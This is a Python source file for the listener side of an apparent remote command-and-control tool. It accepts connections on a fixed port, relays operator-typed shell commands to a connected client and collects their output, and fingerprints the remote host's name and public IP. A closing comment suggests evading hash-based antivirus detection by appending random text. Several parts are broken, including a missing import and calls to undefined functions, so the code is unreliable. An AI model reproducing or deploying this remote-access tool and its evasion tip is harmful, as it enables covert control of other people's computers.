## SErver

import subprocess as sp
import socket
import threading

PORT = 5062

#SERVER = "192.168.0.10"
HEADER = 64
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER,PORT)

DISCONNECT_MESSAGE = "!quit"

FORMAT = 'utf-8'


from contextlib import contextmanager

@contextmanager
def socketcontext(*args, **kw):
    s = socket.socket(*args, **kw)
    
    try:
        yield s
        
    finally:
        s.close()
        


def handle_client(conn,addr):    
    print("New Connection")

    connected = True
    while connected: 
        #user_input = input("[SHELL]:")

        #try:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            ## All this first part is fore is for establsihing a connection/getting right message length, if it errors out 
            # then it moves on (aka connection alread established)
            try:
                msg_length = int(msg_length)
                
            except:
                print("{DEBUG]: CONN ERROR MSG LENGTH PROTOCOL THINGY")
            ## recieving message
            #handle_client.recieve_msg = conn.recv(msg_length).decode(FORMAT)

            ## sending messages/commands & receiving them back
            #handle_client.send_msg = conn.send(user_input.encode(FORMAT))
            #handle_client.recieve_msg = conn.recv(10000).decode(FORMAT)

            ## printing/returning message
            #return(str(handle_client.recieve_msg))
    
    conn.close()


## Sending message to client, from pre-established conenction 
def send_msg(message):
    start.conn.send(message.encode(FORMAT))
    recieve_msg = start.conn.recv(10000).decode(FORMAT)
    
    return(recieve_msg)


class host:
    
    def hostname():
        name = handle_client.send_msg("hostname")
        return(name)
    
    def pub_ip():
        pub_ip_raw = send("nslookup myip.opendns.com resolver1.opendns.com")
        
        ## finds last match, aka the external IP
        ip_address = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')

        #ip_address = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
        try:
            pub_ip = ip_address.search(pub_ip_raw)[1]
        except:
            pub_ip = "Not Found"
        
        return pub_ip


def start():
    #with socketcontext(socket.AF_INET, socket.SOCK_STREAM) as server:
    ## binding address
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(ADDR)
        
        ## starting listener
    server.listen()

    while True:
        start.conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(start.conn, addr))
        thread.start()
        return True
            #print(f"[CONNECTIONS] {threading.active_count()-1}")

if __name__ == "__main__":
    start()
    while True:
        command = input(":")
        send_msg(command)


## notes:
## defeat detection by hashing by adding a random string to the end of this file (commented out)